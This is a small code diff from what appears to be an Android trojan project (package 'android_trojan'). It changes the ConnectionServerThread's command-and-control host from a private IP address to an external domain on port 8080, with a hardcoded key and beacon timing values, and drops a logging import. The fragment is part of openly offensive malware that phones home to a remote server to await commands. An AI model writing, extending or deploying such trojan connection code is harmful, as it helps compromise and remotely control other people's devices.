@@ -2,7 +2,7 @@ package trojan.android.android_trojan.Action;
 
 import android.content.Context;
 import android.os.Looper;
-import android.util.Log;
+
 
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -38,7 +38,7 @@ public class ConnectionServerThread implements Runnable {
         this.context = context;
         this.httpURLConnection = new HttpsURLConnectionHelper();
         this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
-        this.host = "10.10.162.233";
+        this.host = "trojan.remijouannet.com";
         this.port = "8080";
         this.timeon = 4000;
         this.timeoff = 54000;
